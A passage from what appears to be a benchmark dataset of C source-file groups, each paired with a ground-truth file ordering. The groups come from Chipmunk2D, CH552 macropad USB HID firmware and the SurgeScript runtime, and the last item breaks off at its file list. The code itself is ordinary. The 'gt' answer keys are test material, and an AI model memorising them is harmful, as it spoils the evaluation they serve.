*)alloca(__count__*sizeof(cpVect)); \\\nint __count_var__ = cpConvexHull(__count__, __verts__, __verts_var__, NULL, 0.0); \\\n\n\nstatic inline cpVect\ncpClosetPointOnSegment(const cpVect p, const cpVect a, const cpVect b)\n{\n\tcpVect delta = cpvsub(a, b);\n\tcpFloat t = cpfclamp01(cpvdot(delta, cpvsub(p, b))/cpvlengthsq(delta));\n\treturn cpvadd(b, cpvmult(delta, t));\n}\n\n#if defined(__has_extension)\n#if __has_extension(blocks)\n\n\n\n\nvoid cpSpaceEachBody_b(cpSpace *space, void (^block)(cpBody *body));\nvoid cpSpaceEachShape_b(cpSpace *space, void (^block)(cpShape *shape));\nvoid cpSpaceEachConstraint_b(cpSpace *space, void (^block)(cpConstraint *constraint));\n\nvoid cpBodyEachShape_b(cpBody *body, void (^block)(cpShape *shape));\nvoid cpBodyEachConstraint_b(cpBody *body, void (^block)(cpConstraint *constraint));\nvoid cpBodyEachArbiter_b(cpBody *body, void (^block)(cpArbiter *arbiter));\n\ntypedef void (^cpSpacePointQueryBlock)(cpShape *shape, cpVect point, cpFloat distance, cpVect gradient);\nvoid cpSpacePointQuery_b(cpSpace *space, cpVect point, cpFloat maxDistance, cpShapeFilter filter, cpSpacePointQueryBlock block);\n\ntypedef void (^cpSpaceSegmentQueryBlock)(cpShape *shape, cpVect point, cpVect normal, cpFloat alpha);\nvoid cpSpaceSegmentQuery_b(cpSpace *space, cpVect start, cpVect end, cpFloat radius, cpShapeFilter filter, cpSpaceSegmentQueryBlock block);\n\ntypedef void (^cpSpaceBBQueryBlock)(cpShape *shape);\nvoid cpSpaceBBQuery_b(cpSpace *space, cpBB bb, cpShapeFilter filter, cpSpaceBBQueryBlock block);\n\ntypedef void (^cpSpaceShapeQueryBlock)(cpShape *shape, cpContactPointSet *points);\ncpBool cpSpaceShapeQuery_b(cpSpace *space, cpShape *shape, cpSpaceShapeQueryBlock block);\n\n#endif\n#endif\n\n\n\n\n#ifdef __cplusplus\n}\n\nstatic inline cpVect operator *(const cpVect v, const cpFloat s){return cpvmult(v, s);}\nstatic inline cpVect operator +(const cpVect v1, const cpVect v2){return cpvadd(v1, v2);}\nstatic inline cpVect operator -(const cpVect v1, const cpVect v2){return cpvsub(v1, v2);}\nstatic inline cpBool operator ==(const cpVect v1, const cpVect v2){return cpveql(v1, v2);}\nstatic inline cpVect operator -(const cpVect v){return cpvneg(v);}\n\n#endif\n#endif\n",
        "gt": [
            "'Chipmunk2D/include/chipmunk/cpRotaryLimitJoint.h'",
            "'Chipmunk2D/include/chipmunk/cpConstraint.h'",
            "'Chipmunk2D/include/chipmunk/chipmunk.h'",
            "'Chipmunk2D/demo/Chains.c'"
        ]
    },
    {
        "files": [
            "'CH552-MacroPad-plus/software/src/usb_hid.h'",
            "'CH552-MacroPad-plus/software/src/usb_handler.h'",
            "'CH552-MacroPad-plus/software/src/usb_composite.c'",
            "'CH552-MacroPad-plus/software/src/usb_composite.h'"
        ],
        "content": "'CH552-MacroPad-plus/software/src/usb_hid.h'\n:\n\n\n\n\n\n\n\n#pragma once\n\n#include <stdint.h>\n\n#include \"usb_handler.h\"\n\n\n\nvoid HID_init(void);\n\nvoid HID_sendReport(__xdata uint8_t* buf, uint8_t len);\n\n\n'CH552-MacroPad-plus/software/src/usb_handler.h'\n:\n\n\n\n#pragma once\n#include <stdint.h>\n#include \"usb_descr.h\"\n\n\n\n\n__xdata __at (EP0_ADDR) uint8_t EP0_buffer[EP0_BUF_SIZE];\n__xdata __at (EP1_ADDR) uint8_t EP1_buffer[EP1_BUF_SIZE];\n__xdata __at (EP2_ADDR) uint8_t EP2_buffer[EP2_BUF_SIZE];\n\n#define USB_setupBuf ((PUSB_SETUP_REQ)EP0_buffer)\nextern uint8_t SetupReq;\n\n\n\n\nvoid HID_setup(void);\nvoid HID_reset(void);\nvoid HID_EP1_IN(void);\nvoid HID_EP2_OUT(void);\n\n\n\n\n\n#define USB_INIT_handler    HID_setup\n#define USB_RESET_handler   HID_reset\n\n\n#define EP0_SETUP_callback  USB_EP0_SETUP\n#define EP0_IN_callback     USB_EP0_IN\n#define EP0_OUT_callback    USB_EP0_OUT\n#define EP1_IN_callback     HID_EP1_IN\n#define EP2_OUT_callback    HID_EP2_OUT\n\n\n\n\nvoid USB_interrupt(void);\nvoid USB_init(void);\n\n'CH552-MacroPad-plus/software/src/usb_composite.c'\n:\n\n\n\n\n\n\n\n#include \"usb_composite.h\"\n\n#include \"usb_hid.h\"\n\n#include \"usb_handler.h\"\n\n\n\n#define KBD_sendReport()    HID_sendReport(KBD_report, sizeof(KBD_report))\n\n#define CON_sendReport()    HID_sendReport(CON_report, sizeof(CON_report))\n\n#define JOY_sendReport()    HID_sendReport(JOY_report, sizeof(JOY_report))\n\n#define MOUSE_sendReport()  HID_sendReport(MOUSE_report, sizeof(MOUSE_report))\n\n\n\n\n\n\n\n\n\n__xdata uint8_t KBD_report[]   = {1,0,0,0,0,0,0,0};\n\n__xdata uint8_t CON_report[]   = {2,0,0};\n\n__xdata uint8_t MOUSE_report[] = {3,0,0,0,0};\n\n__xdata uint8_t JOY_report[]   = {4,0,0,0};\n\n\n\n\n\n\n\n\n\n__code uint8_t KBD_map[128] = {\n\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2a, 0x2b, 0x28, 0x00, 0x00, 0x00,\n\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n\n  0x00, 0x00, 0x00, 0x00, 0x2c, 0x9e, 0xb4, 0xa0, 0xa1, 0xa2, 0xa4, 0x34, 0xa6, 0xa7,\n\n  0xa5, 0xae, 0x36, 0x2d, 0x37, 0x38, 0x27, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 0x24,\n\n  0x25, 0x26, 0xb3, 0x33, 0xb6, 0x2e, 0xb7, 0xb8, 0x9f, 0x84, 0x85, 0x86, 0x87, 0x88,\n\n  0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96,\n\n  0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x2f, 0x31, 0x30, 0xa3, 0xad, 0x35, 0x04,\n\n  0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12,\n\n  0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0xaf, 0xb1, 0xb0,\n\n  0xb5, 0x00\n\n};\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid KBD_press(uint8_t key) {\n\n  uint8_t i;\n\n\n\n\n\n  if(key >= 136) key -= 136;\n\n  else if(key >= 128) {\n\n    KBD_report[1] |= (1<<(key-128));\n\n    key = 0;\n\n  }\n\n  else {\n\n    key = KBD_map[key];\n\n    if(!key) return;\n\n    if(key & 0x80) {\n\n      KBD_report[1] |= 0x02;\n\n      key &= 0x7F;\n\n    }\n\n  }\n\n\n\n\n\n  for(i=3; i<8; i++) {\n\n    if(KBD_report[i] == key) return;\n\n  }\n\n\n\n\n\n  for(i=3; i<8; i++) {\n\n    if(KBD_report[i] == 0) {\n\n      KBD_report[i] = key;\n\n      KBD_sendReport();\n\n      return;\n\n    }\n\n  }\n\n}\n\n\n\n\n\nvoid KBD_release(uint8_t key) {\n\n  uint8_t i;\n\n\n\n\n\n  if(key >= 136) key -= 136;\n\n  else if(key >= 128) {\n\n    KBD_report[1] &= ~(1<<(key-128));\n\n    key = 0;\n\n  }\n\n  else {\n\n    key = KBD_map[key];\n\n    if(!key) return;\n\n    if(key & 0x80) {\n\n      KBD_report[1] &= ~0x02;\n\n      key &= 0x7F;\n\n    }\n\n  }\n\n\n\n\n\n  for(i=3; i<8; i++) {\n\n    if(KBD_report[i] == key) KBD_report[i] = 0;\n\n  }\n\n  KBD_sendReport();\n\n}\n\n\n\n\n\nvoid KBD_type(uint8_t key) {\n\n  KBD_press(key);\n\n  KBD_release(key);\n\n}\n\n\n\n\n\nvoid KBD_releaseAll(void) {\n\n  uint8_t i;\n\n  for(i=7; i; i--) KBD_report[i] = 0;\n\n  KBD_sendReport();\n\n}\n\n\n\n\n\nvoid KBD_print(char* str) {\n\n  while(*str) KBD_type(*str++);\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid CON_press(uint8_t key) {\n\n  CON_report[1] = key;\n\n  CON_sendReport();\n\n}\n\n\n\n\n\nvoid CON_release(void) {\n\n  CON_report[1] = 0;\n\n  CON_sendReport();\n\n}\n\n\n\n\n\nvoid CON_type(uint8_t key) {\n\n  CON_press(key);\n\n  CON_release();\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid MOUSE_press(uint8_t buttons) {\n\n  MOUSE_report[1] |= buttons;\n\n  MOUSE_sendReport();\n\n}\n\n\n\n\n\nvoid MOUSE_release(uint8_t buttons) {\n\n  MOUSE_report[1] &= ~buttons;\n\n  MOUSE_sendReport();\n\n}\n\n\n\n\n\nvoid MOUSE_move(int8_t xrel, int8_t yrel) {\n\n  MOUSE_report[2] = (uint8_t)xrel;\n\n  MOUSE_report[3] = (uint8_t)yrel;\n\n  MOUSE_sendReport();\n\n  MOUSE_report[2] = 0;\n\n  MOUSE_report[3] = 0;\n\n}\n\n\n\n\n\nvoid MOUSE_wheel(int8_t rel) {\n\n  MOUSE_report[4] = (uint8_t)rel;\n\n  MOUSE_sendReport();\n\n  MOUSE_report[4] = 0;\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid JOY_press(uint8_t buttons) {\n\n  JOY_report[1] |= buttons;\n\n  JOY_sendReport();\n\n}\n\n\n\n\n\nvoid JOY_release(uint8_t buttons) {\n\n  JOY_report[1] &= ~buttons;\n\n  JOY_sendReport();\n\n}\n\n\n\n\n\nvoid JOY_move(int8_t xrel, int8_t yrel) {\n\n  JOY_report[2] = (uint8_t)xrel;\n\n  JOY_report[3] = (uint8_t)yrel;\n\n  JOY_sendReport();\n\n}\n\n\n'CH552-MacroPad-plus/software/src/usb_composite.h'\n:\n\n\n\n\n\n\n\n#pragma once\n\n#include <stdint.h>\n\n#include \"usb_hid.h\"\n\n\n\n\n\nvoid KBD_press(uint8_t key);\n\nvoid KBD_release(uint8_t key);\n\nvoid KBD_type(uint8_t key);\n\nvoid KBD_releaseAll(void);\n\nvoid KBD_print(char* str);\n\n\n\nvoid CON_press(uint8_t key);\n\nvoid CON_release(void);\n\nvoid CON_type(uint8_t key);\n\n\n\nvoid MOUSE_press(uint8_t buttons);\n\nvoid MOUSE_release(uint8_t buttons);\n\nvoid MOUSE_move(int8_t xrel, int8_t yrel);\n\nvoid MOUSE_wheel(int8_t rel);\n\n\n\nvoid JOY_press(uint8_t buttons);\n\nvoid JOY_release(uint8_t buttons);\n\nvoid JOY_move(int8_t xrel, int8_t yrel);\n\n\n\n#define MOUSE_wheel_up()        MOUSE_wheel( 1)\n\n#define MOUSE_wheel_down()      MOUSE_wheel(-1)\n\n\n\n#define JOY_center()            JOY_move(   0,   0)\n\n#define JOY_up()                JOY_move(   0,-127)\n\n#define JOY_down()              JOY_move(   0, 127)\n\n#define JOY_left()              JOY_move(-127,   0)\n\n#define JOY_right()             JOY_move( 127,   0)\n\n\n\n\n\n#define KBD_getState()          (EP2_buffer[0])\n\n#define KBD_NUM_LOCK_state      (KBD_getState() & 1)\n\n#define KBD_CAPS_LOCK_state     ((KBD_getState() >> 1) & 1)\n\n#define KBD_SCROLL_LOCK_state   ((KBD_getState() >> 2) & 1)\n\n#define KBD_COMPOSE_state       ((KBD_getState() >> 3) & 1)\n\n#define KBD_KANA_state          ((KBD_getState() >> 4) & 1)\n\n\n\n\n\n#define KBD_KEY_LEFT_CTRL       0x80\n\n#define KBD_KEY_LEFT_SHIFT      0x81\n\n#define KBD_KEY_LEFT_ALT        0x82\n\n#define KBD_KEY_LEFT_GUI        0x83\n\n#define KBD_KEY_RIGHT_CTRL      0x84\n\n#define KBD_KEY_RIGHT_SHIFT     0x85\n\n#define KBD_KEY_RIGHT_ALT       0x86\n\n#define KBD_KEY_RIGHT_GUI       0x87\n\n\n\n\n\n#define KBD_KEY_UP_ARROW        0xDA\n\n#define KBD_KEY_DOWN_ARROW      0xD9\n\n#define KBD_KEY_LEFT_ARROW      0xD8\n\n#define KBD_KEY_RIGHT_ARROW     0xD7\n\n#define KBD_KEY_BACKSPACE       0xB2\n\n#define KBD_KEY_TAB             0xB3\n\n#define KBD_KEY_RETURN          0xB0\n\n#define KBD_KEY_ESC             0xB1\n\n#define KBD_KEY_INSERT          0xD1\n\n#define KBD_KEY_DELETE          0xD4\n\n#define KBD_KEY_PAGE_UP         0xD3\n\n#define KBD_KEY_PAGE_DOWN       0xD6\n\n#define KBD_KEY_HOME            0xD2\n\n#define KBD_KEY_END             0xD5\n\n#define KBD_KEY_CAPS_LOCK       0xC1\n\n#define KBD_KEY_F1              0xC2\n\n#define KBD_KEY_F2              0xC3\n\n#define KBD_KEY_F3              0xC4\n\n#define KBD_KEY_F4              0xC5\n\n#define KBD_KEY_F5              0xC6\n\n#define KBD_KEY_F6              0xC7\n\n#define KBD_KEY_F7              0xC8\n\n#define KBD_KEY_F8              0xC9\n\n#define KBD_KEY_F9              0xCA\n\n#define KBD_KEY_F10             0xCB\n\n#define KBD_KEY_F11             0xCC\n\n#define KBD_KEY_F12             0xCD\n\n#define KBD_KEY_F13             0xF0\n\n#define KBD_KEY_F14             0xF1\n\n#define KBD_KEY_F15             0xF2\n\n#define KBD_KEY_F16             0xF3\n\n#define KBD_KEY_F17             0xF4\n\n#define KBD_KEY_F18             0xF5\n\n#define KBD_KEY_F19             0xF6\n\n#define KBD_KEY_F20             0xF7\n\n#define KBD_KEY_F21             0xF8\n\n#define KBD_KEY_F22             0xF9\n\n#define KBD_KEY_F23             0xFA\n\n#define KBD_KEY_F24             0xFB\n\n\n\n\n\n#define CON_SYS_POWER           0x30\n\n#define CON_SYS_RESET           0x31\n\n#define CON_SYS_SLEEP           0x32\n\n\n\n#define CON_VOL_MUTE            0xE2\n\n#define CON_VOL_UP              0xE9\n\n#define CON_VOL_DOWN            0xEA\n\n\n\n#define CON_MEDIA_PLAY          0xB0\n\n#define CON_MEDIA_PAUSE         0xB1\n\n#define CON_MEDIA_RECORD        0xB2\n\n#define CON_MEDIA_FORWARD       0xB3\n\n#define CON_MEDIA_REWIND        0xB4\n\n#define CON_MEDIA_NEXT          0xB5\n\n#define CON_MEDIA_PREV          0xB6\n\n#define CON_MEDIA_STOP          0xB7\n\n#define CON_MEDIA_EJECT         0xB8\n\n#define CON_MEDIA_RANDOM        0xB9\n\n\n\n#define CON_MENU                0x40\n\n#define CON_MENU_PICK           0x41\n\n#define CON_MENU_UP             0x42\n\n#define CON_MENU_DOWN           0x43\n\n#define CON_MENU_LEFT           0x44\n\n#define CON_MENU_RIGHT          0x45\n\n#define CON_MENU_ESCAPE         0x46\n\n#define CON_MENU_INCR           0x47\n\n#define CON_MENU_DECR           0x48\n\n\n\n\n\n#define MOUSE_BUTTON_LEFT       0x01\n\n#define MOUSE_BUTTON_RIGHT      0x02\n\n#define MOUSE_BUTTON_MIDDLE     0x04\n\n",
        "gt": [
            "'CH552-MacroPad-plus/software/src/usb_handler.h'",
            "'CH552-MacroPad-plus/software/src/usb_hid.h'",
            "'CH552-MacroPad-plus/software/src/usb_composite.h'",
            "'CH552-MacroPad-plus/software/src/usb_composite.c'"
        ]
    },
    {
        "files": [
            "'surgescript/src/surgescript/runtime/program.h'",
            "'surgescript/src/surgescript.h'",
            "'surgescript/src/surgescript/runtime/renv.h'",
            "'surgescript/src/main.c'"
        ],
        "content": "'surgescript/src/surgescript/runtime/program.h'\n:\n\n#ifndef _SURGESCRIPT_RUNTIME_PROGRAM_H\n#define _SURGESCRIPT_RUNTIME_PROGRAM_H\n\n#include <stdio.h>\n#include <stdint.h>\n#include <stdbool.h>\n#include \"renv.h\"\n#include \"program_operators.h\"\n#include \"variable.h\"\n#include \"object.h\"\n#include \"../util/util.h\"\n\n\n\n\ntypedef struct surgescript_program_t surgescript_program_t;\nstruct surgescript_program_t;\n\n\ntypedef surgescript_var_t* (*surgescript_program_cfunction_t)(surgescript_object_t*, const surgescript_var_t**, int);\n\n\ntypedef unsigned surgescript_program_label_t;\n#define SURGESCRIPT_PROGRAM_UNDEFINED_LABEL (surgescript_program_label_t)(~0u)\n\n\ntypedef enum surgescript_program_operator_t {\n    #define DECLARE_CODES(x, y) x,\n    SURGESCRIPT_PROGRAM_OPERATORS(DECLARE_CODES)\n} surgescript_program_operator_t;\n\n\ntypedef union surgescript_program_operand_t {\n    double f;\n    uint32_t u;\n    int32_t i;\n    bool b;\n    uint64_t u64;\n    int64_t i64;\n    void* p;\n} surgescript_program_operand_t;\nSS_STATIC_ASSERT(sizeof(surgescript_program_operand_t) == sizeof(uint64_t));\n\n#define SSOP()   SSOPu(0)\n#define SSOPu(x) surgescript_program_operand_u(x)\n#define SSOPf(x) surgescript_program_operand_f(x)\n#define SSOPi(x) surgescript_program_operand_i(x)\n#define SSOPb(x) surgescript_program_operand_b(x)\n#define SSOPp(x) surgescript_program_operand_p(x)\n\nstatic inline surgescript_program_operand_t surgescript_program_operand_u(unsigned u) { surgescript_program_operand_t o = { .u64 = 0 }; o.u = u; return o; }\nstatic inline surgescript_program_operand_t surgescript_program_operand_f(double f) { surgescript_program_operand_t o = { .u64 = 0 }; o.f = f; return o; }\nstatic inline surgescript_program_operand_t surgescript_program_operand_b(bool b) { surgescript_program_operand_t o = { .u64 = 0 }; o.b = b; return o; }\nstatic inline surgescript_program_operand_t surgescript_program_operand_i(int i) { surgescript_program_operand_t o = { .u64 = 0 }; o.i = i; return o; }\nstatic inline surgescript_program_operand_t surgescript_program_operand_p(void* p) { surgescript_program_operand_t o = { .u64 = 0 }; o.p = p; return o; }\n\n\n\n\n\n\n\n\n\nsurgescript_program_t* surgescript_program_create(int arity);\nsurgescript_program_t* surgescript_program_create_native(int arity, surgescript_program_cfunction_t cfunction);\nsurgescript_program_t* surgescript_program_destroy(surgescript_program_t* program);\nvoid surgescript_program_call(surgescript_program_t* program, surgescript_renv_t* runtime_environment, int num_params);\n\n\nsurgescript_program_label_t surgescript_program_new_label(surgescript_program_t* program);\nvoid surgescript_program_add_label(surgescript_program_t* program, surgescript_program_label_t label);\nint surgescript_program_add_line(surgescript_program_t* program, surgescript_program_operator_t op, surgescript_program_operand_t a, surgescript_program_operand_t b);\nint surgescript_program_chg_line(surgescript_program_t* program, int line, surgescript_program_operator_t op, surgescript_program_operand_t a, surgescript_program_operand_t b);\nbool surgescript_program_read_line(const surgescript_program_t* program, int line, surgescript_program_operator_t* op, surgescript_program_operand_t* a, surgescript_program_operand_t* b);\nint surgescript_program_count_lines(const surgescript_program_t* program);\nsurgescript_program_label_t surgescript_program_find_label(const surgescript_program_t* program, int line);\n\n\nint surgescript_program_arity(const surgescript_program_t* program);\nconst char* surgescript_program_get_text(const surgescript_program_t* program, int index);\nint surgescript_program_add_text(surgescript_program_t* program, const char* text);\nint surgescript_program_find_text(const surgescript_program_t* program, const char* text);\nint surgescript_program_text_count(const surgescript_program_t* program);\nvoid surgescript_program_dump(surgescript_program_t* program, FILE* fp);\nbool surgescript_program_is_native(const surgescript_program_t* program);\n\n#endif\n\n'surgescript/src/surgescript.h'\n:\n\n#ifndef _SURGESCRIPT_H\n#define _SURGESCRIPT_H\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#include \"surgescript/runtime/vm.h\"\n#include \"surgescript/runtime/program.h\"\n#include \"surgescript/runtime/object.h\"\n#include \"surgescript/runtime/program_pool.h\"\n#include \"surgescript/runtime/object_manager.h\"\n#include \"surgescript/runtime/tag_system.h\"\n#include \"surgescript/runtime/vm_time.h\"\n#include \"surgescript/runtime/heap.h\"\n#include \"surgescript/runtime/stack.h\"\n#include \"surgescript/runtime/variable.h\"\n#include \"surgescript/compiler/parser.h\"\n#include \"surgescript/util/transform.h\"\n#include \"surgescript/util/ssarray.h\"\n#include \"surgescript/util/util.h\"\n#include \"surgescript/util/version.h\"\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'surgescript/src/surgescript/runtime/renv.h'\n:\n\n#ifndef _SURGESCRIPT_RUNTIME_RENV_H\n#define _SURGESCRIPT_RUNTIME_RENV_H\n\n\nstruct surgescript_object_t;\nstruct surgescript_stack_t;\nstruct surgescript_heap_t;\nstruct surgescript_programpool_t;\nstruct surgescript_objectmanager_t;\n\n\n\n\ntypedef struct surgescript_renv_t\n{\n    struct surgescript_object_t* owner;\n    struct surgescript_stack_t* stack;\n    struct surgescript_heap_t* heap;\n    struct surgescript_programpool_t* program_pool;\n    struct surgescript_objectmanager_t* object_manager;\n    struct surgescript_var_t** tmp;\n    struct surgescript_renv_t* (*_destructor)(struct surgescript_renv_t*);\n    unsigned caller;\n} surgescript_renv_t ;\n\n\nsurgescript_renv_t* surgescript_renv_create(struct surgescript_object_t* owner, struct surgescript_stack_t* stack, struct surgescript_heap_t* heap, struct surgescript_programpool_t* program_pool, struct surgescript_objectmanager_t* object_manager, struct surgescript_var_t** tmp);\n\n\nsurgescript_renv_t* surgescript_renv_destroy(surgescript_renv_t* runtime_environment);\n\n\n#define surgescript_renv_owner(renv)            ((renv)->owner)\n#define surgescript_renv_stack(renv)            ((renv)->stack)\n#define surgescript_renv_heap(renv)             ((renv)->heap)\n#define surgescript_renv_programpool(renv)      ((renv)->program_pool)\n#define surgescript_renv_objectmanager(renv)    ((renv)->object_manager)\n#define surgescript_renv_tmp(renv)              ((renv)->tmp)\n#define surgescript_renv_caller(renv)           ((renv)->caller)\n\n#endif\n'surgescript/src/main.c'\n:\n\n#include <surgescript.h>\n#include <locale.h>\n#include <string.h>\n#include <stdio.h>\n#include <time.h>\n#include <limits.h>\n\n\n#if ENABLE_THREADS\n# if __STDC_VERSION__ >= 201112L && !defined(__STDC_NO_THREADS__)\n#  include <threads.h>\n# else\n#  error \"Can't compile the SurgeScript CLI: threads.h is not found on this environment. Please change the environment or disable multithreading.\"\n# endif\n#endif\n\nstatic surgescript_vm_t* make_vm(int argc, char** argv, int* time_limit);\nstatic void run_vm(surgescript_vm_t* vm, int time_limit);\nstatic void destroy_vm(surgescript_vm_t* vm);\nstatic void print(const char* message);\nstatic void crash(const char* message);\nstatic void discard(const char* message);\nstatic void show_help(const char* executable);\nstatic char* read_from_stdin();\n\n#if ENABLE_THREADS\nstatic mtx_t mutex;\nstatic cnd_t cond;\nstatic bool quit, stop;\nstatic int main_loop(void* arg);\nstatic bool timeout(time_t limit);\n#endif\n\n\n#define DEFAULT_TIME_LIMIT 30000\n\n\nint main(int argc, char* argv[])\n{\n    int time_limit = DEFAULT_TIME_LIMIT;\n\n\n    setlocale(LC_ALL, \"en_US.UTF-8\");\n\n\n    surgescript_vm_t* vm = make_vm(argc, argv, &time_limit);\n\n\n    if(vm != NULL) {\n\n\n        run_vm(vm, time_limit);\n\n\n        destroy_vm(vm);\n\n    }\n\n\n    return 0;\n}\n\n\nvoid run_vm(surgescript_vm_t* vm, int time_limit)\n{\n#define show_time_limit_error() \\\n    fprintf(stderr, \"Time limit of %d seconds exceeded.\\n\", time_limit)\n\n#if !ENABLE_THREADS\n\n    uint64_t start_time = surgescript_util_gettickcount();\n    uint64_t end_time = start_time + (uint64_t)time_limit * 1000;\n\n\n    while(surgescript_vm_update(vm)) {\n\n\n        if(surgescript_util_gettickcount() > end_time) {\n            show_time_limit_error();\n            break;\n        }\n\n    }\n\n#else\n\n\n    struct timespec ts;\n    timespec_get(&ts, TIME_UTC);\n    ts.tv_sec += time_limit;\n    time_t limit = ts.tv_sec;\n\n    quit = stop = false;\n    mtx_init(&mutex, mtx_timed);\n    cnd_init(&cond);\n\n\n    thrd_t thread;\n    thrd_create(&thread, main_loop, vm);\n\n\n    mtx_lock(&mutex);\n    while(!quit && !timeout(limit))\n        cnd_timedwait(&cond, &mutex, &ts);\n    mtx_unlock(&mutex);\n\n\n    if(timeout(limit)) {\n        show_time_limit_error();\n\n\n        mtx_lock(&mutex);\n        stop = true;\n        mtx_unlock(&mutex);\n        thrd_join(thread, NULL);\n    }\n\n\n    cnd_destroy(&cond);\n    mtx_destroy(&mutex);\n\n#endif\n\n#undef show_time_limit_error\n}\n\n\nvoid destroy_vm(surgescript_vm_t* vm)\n{\n    surgescript_vm_destroy(vm);\n}\n\n#if ENABLE_THREADS\n\n\nint main_loop(void* arg)\n{\n    surgescript_vm_t* vm = (surgescript_vm_t*)arg;\n    bool end = false;\n\n    while(!end && surgescript_vm_update(vm)) {\n        mtx_lock(&mutex);\n        end = stop;\n        mtx_unlock(&mutex);\n\n        thrd_yield();\n    }\n\n    mtx_lock(&mutex);\n    quit = true;\n    cnd_broadcast(&cond);\n    mtx_unlock(&mutex);\n\n    return 0;\n}\n\n\nbool timeout(time_t limit)\n{\n    struct timespec ts;\n    timespec_get(&ts, TIME_UTC);\n    return ts.tv_sec > limit;\n}\n\n#endif\n\n\nsurgescript_vm_t* make_vm(int argc, char** argv, int* time_limit)\n{\n    surgescript_vm_t* vm = NULL;\n    int i;\n\n\n    surgescript_util_set_error_functions(discard, crash);\n\n\n    for(i = 1; i < argc && *argv[i] == '-'; i++) {\n        const char* arg = argv[i];\n        if(strcmp(arg, \"--debug\") == 0 || strcmp(arg, \"-D\") == 0) {\n\n            surgescript_util_set_error_functions(print, crash);\n        }\n        else if(strcmp(arg, \"--version\") == 0 || strcmp(arg, \"-v\") == 0) {\n\n            printf(\"%s\\n\", surgescript_util_version());\n            return NULL;\n        }\n        else if(strcmp(arg, \"--help\") == 0 || strcmp(arg, \"-h\") == 0) {\n\n            show_help(surgescript_util_basename(argv[0]));\n            return NULL;\n        }\n        else if(strcmp(arg, \"--timelimit\") == 0 || strcmp(arg, \"-t\") == 0) {\n\n            if(++i < argc && time_limit != NULL) {\n                int seconds = atoi(argv[i]);\n                *time_limit = (seconds > 0) ? seconds : INT_MAX;\n            }\n        }\n        else if(strcmp(arg, \"--\") == 0) {\n\n            break;\n        }\n        else {\n\n            fprintf(stderr, \"Unrecognized option: '%s'.\\nType '%s --help' for more information.\\n\", arg, surgescript_util_basename(argv[0]));\n            return NULL;\n        }\n    }\n\n\n    vm = surgescript_vm_create();\n\n\n    if(i < argc && strcmp(argv[i], \"--\") != 0) {\n\n        for(; i < argc && strcmp(argv[i], \"--\") != 0; i++) {\n            const char* file = argv[i];\n            surgescript_vm_compile(vm, file);\n        }\n    }\n    else {\n        fprintf(stderr, \"Reading from stdin... Run '%s -h' for help.\\n\", surgescript_util_basename(argv[0]));\n\n\n        char* code = read_from_stdin();\n        surgescript_vm_compile_code_in_memory(vm, code);\n        ssfree(code);\n    }\n\n\n    if(i < argc && strcmp(argv[i], \"--\") == 0) {\n\n        ++i;\n        surgescript_vm_launch_ex(vm, argc - i, (char**)(argv + i));\n    }\n    else {\n\n        surgescript_vm_launch(vm);\n    }\n\n\n    return vm;\n}\n\n\nvoid show_help(const char* executable)\n{\n    printf(\n        \"SurgeScript version %s\\n\"\n        \"Copyright (C) %s %s\\n\"\n        \"%s\\n\"\n        \"\\n\"\n        \"Usage: %s [OPTIONS] <scripts>\\n\"\n        \"Compiles and executes the given script(s).\\n\"\n        \"\\n\"\n        \"Options:\\n\"\n        \"    -v, --version                         shows the version of SurgeScript\\n\"\n        \"    -D, --debug                           prints debugging information\\n\"\n        \"    -t, --timelimit                       sets a maximum execution time, in seconds (0 = no limit)\\n\"\n        \"    -h, --help                            shows this message\\n\"\n        \"\\n\"\n        \"Examples:\\n\"\n        \"    %s script.ss                 compiles and executes script.ss\\n\"\n        \"    %s file1.ss file2.ss         compiles and executes file1.ss and file2.ss\\n\"\n        \"    %s --debug test.ss           compiles and runs test.ss with debugging information\\n\"\n        \"    %s file.ss -- -x -y          passes custom arguments -x and -y to file.ss\\n\"\n        \"    %s -t 5                      runs a script read from stdin, with a time limit of 5 seconds\\n\"\n        \"\\n\"\n        \"Full documentation available at: <%s>\\n\",\n        surgescript_util_version(),\n        surgescript_util_years(),\n        surgescript_util_author(),\n        surgescript_util_website(),\n        executable,\n        executable,\n        executable,\n        executable,\n        executable,\n        executable,\n        surgescript_util_website()\n    );\n}\n\n\nvoid print(const char* message)\n{\n    puts(message);\n}\n\n\nvoid crash(const char* message)\n{\n    fprintf(stderr, \"%s\\n\", message);\n    exit(1);\n}\n\n\nvoid discard(const char* message)\n{\n    ;\n}\n\n\nchar* read_from_stdin()\n{\n    const size_t BUFSIZE = 1024;\n    char* data = NULL;\n    size_t read_chars = 0, data_size = 0;\n\n\n    do {\n        data_size += BUFSIZE;\n        data = ssrealloc(data, data_size + 1);\n        read_chars += fread(data + read_chars, sizeof(char), BUFSIZE, stdin);\n        data[read_chars] = '\\0';\n    } while(read_chars == data_size);\n\n\n    return data;\n}\n",
        "gt": [
            "'surgescript/src/surgescript/runtime/renv.h'",
            "'surgescript/src/surgescript/runtime/program.h'",
            "'surgescript/src/surgescript.h'",
            "'surgescript/src/main.c'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFISoftSkuInfo.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/FastbootLib/UsbDescriptors.c'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/Board.h'"
        ],
